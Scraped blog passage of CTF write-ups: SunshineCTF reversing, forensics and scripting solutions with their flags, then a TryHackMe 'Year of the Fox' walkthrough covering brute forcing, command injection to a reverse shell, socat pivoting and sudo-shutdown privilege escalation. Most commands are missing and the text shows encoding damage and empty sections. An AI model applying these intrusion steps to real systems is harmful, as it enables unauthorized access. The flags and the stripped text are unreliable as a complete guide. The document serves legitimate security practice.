After an observation on the js source, I noticed that the answers would store in an array called global_frequencies(but is the filename, also), and I just modifycurrent_frequencies_used_global into global_frequencies and also with some string implementation, and finally post it to path /flag with itâ€™s built-in function!
Solve Script:

Reversing

Dill

Slover: å ‡å§¬naup

After downloading, you can see a .pyc file.
You can find websites online that can decompiler it.
https://www.toolnb.com/tools-lang-zh-TW/pyc.html
You will get this.

After entering a number, the head and tail will be removed, then cut into groups of four and then swap positions.

I tried to restore it, but it must have been written incorrectly.However, the string length is not long, so you can try it out by using loop.

Solve Script

FLAG:sun{ZGlsbGxpa2V0aGVwaWNrbGVnZXRpdD8K}

After the End

Forensics

Low Effort Wav ğŸŒŠ

Author : å ‡å§¬Naup

After downloading, it looks like a .wav file, but it is actually a .png file.

Convert it back to PNG first

When I open it. The file seems to be cropped .It might be a Cropalyps

We used exiftool to find out that the phone model he used was Google Pixel 7
We can use acropalypse.app to restore the cropped part

Select pixel 7 and restore it

FLAG:sun{well_that_was_low_effort}

Reversing

First Date

Author : å ‡å§¬Naup

Unzip the file he gave you to get a pdx containing main.pdz pdxinfo

I studied the .pdz file and found some information.Playdate is a handheld video game console.
https://play.date/
Playdate game formats

  • luac - Lua bytecode
  • pdz - File container
  • pda - Audio file
  • pdi - Image file
  • pdt - Imagetable file
  • pdv - Video file
  • pds - Strings file
  • pft - Font file

Try to find a playdate related reverse tool and you will find one.
https://github.com/cranksters/playdate-reverse-engineering/tree/main
What is .pdz?

It has given a tool that can unpack all files from a .pdz
You can get a main.luac

Scripting

SimonProgrammer 2

Author : å ‡å§¬Naup

Continue the idea of simon1.
Go grab the variable global_frequencies
You can get this.

After removing /static/ and .wav, base64 the string and remove the irrelevant characters at the beginning and end.

The o that comes out of print() is thrown into the following script.

Just throw it to the console of F12 and it will get flag.

FLAG : sun{simon_says_wait_that_was_a_mistake_what_do_you_mean_the_filenames_were_frequencies}

SimonProgrammer 3

Misc

Knowledge Repository

Pwn

House of Sus

Robot Assembly Line

entry.title: Year of the Fox on TryHackMe
entry.content:
Before all

A fun and relaxing one, my second time to solve a HARD machine on TryHackMe.

Victimâ€™s IP : 10.10.150.100
Attackerâ€™s IP : 10.9.195.189

Write Up

RECON

port scan

Command:

Result:

well â€¦ a web service and a bunch of smb service, speaking honestly, I was shockedâ€¦â€¦(cause Iâ€™m not familiar with smb yet).

enum4linux

enum4linux is a tool being used to leak some informations from a vulnerable linux machine.
Command:

Result:
There was sooooo many informations leaked, but I only used this XD.

There are two UNIX users, fox and rescal.

Exploitation

http auth brute forcing

The web application on port 80 have a http auth, and I used hydra to brute force the password with usernames leaked by enum4linux
Command:

Result:

command injection

After accessing the web application, it looked like thisâ€¦â€¦.

It allows user to search for files, which give me an idea to use command injection attack.
Payload:

Of course, I opened port 1004 to receive shell from victim.

ssh brute forcing

Command:

Result:

wellâ€¦thereâ€™s a ssh service in innet, it would be easier to brute force the userâ€™s password from outnet.

So I wanted to download socat into victimâ€™s machine from my computer so I could open another port on victimâ€™s machine which pass through the innet ssh service, wellâ€¦â€¦.


Permission denied !
So I searched for folder with a writable permissionâ€¦
Command:


P.S. Donâ€™t forget to change permission for it~

The tmp folder can be used !
Now, is time to open ssh service to outnet with socat!
Command:

Finally, here brute forcing is~
Command:

Result:

Now log in with the informations~

Privilege Escalation

poweroff escalation

First of all, check my permission with sudo -l:

I setup a http server from it to find out how /usr/bin/shutdown workâ€¦â€¦
Reverse Engineering with ghidra:

â€¦â€¦.
well, well, wellâ€¦
After that, I searched for the poweroff command on GTFOBins

Nothing found.
WHAT?!!
And finally, I found out this:
https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-shutdown-poweroff-privilege-escalation/
Command:

And finallyâ€¦ get root!!!
But what?

Kinda tricky(
Just a simple hide&see thoughâ€¦


Aha!

Soâ€¦
who can tell me the meaning of:

:>
ğŸ¦ˆğŸ‹ğŸ¦ˆğŸ‹

After all

Now stucked on Year of the Dog :<
